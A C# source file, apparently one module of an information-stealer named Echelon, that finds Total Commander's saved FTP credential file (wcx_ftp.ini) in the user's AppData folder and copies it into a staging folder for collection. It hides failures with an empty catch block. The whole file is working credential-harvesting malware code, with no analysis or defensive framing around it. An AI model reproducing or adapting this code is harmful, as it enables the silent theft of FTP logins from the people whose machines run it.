

using System.IO;

namespace Echelon
{
    internal class TotalCommander
    {
        public static int count;

        public static void GetTotalCommander(string Echelon_Dir)
        {
			try
			{
				var text2 = Help.AppDate + "\\GHISLER\\";
				if (Directory.Exists(text2)) Directory.CreateDirectory(Echelon_Dir + "\\FTP\\Total Commander");
                var files = new DirectoryInfo(text2).GetFiles();
				for (var i = 0; i < files.Length; i++)
                    if (files[i].Name.Contains("wcx_ftp.ini"))
                    {
                       
                        File.Copy(text2 + "wcx_ftp.ini", Echelon_Dir + "\\FTP\\Total Commander\\wcx_ftp.ini");
                        count++;
                    }
            }
			catch {}
		}
    }
}


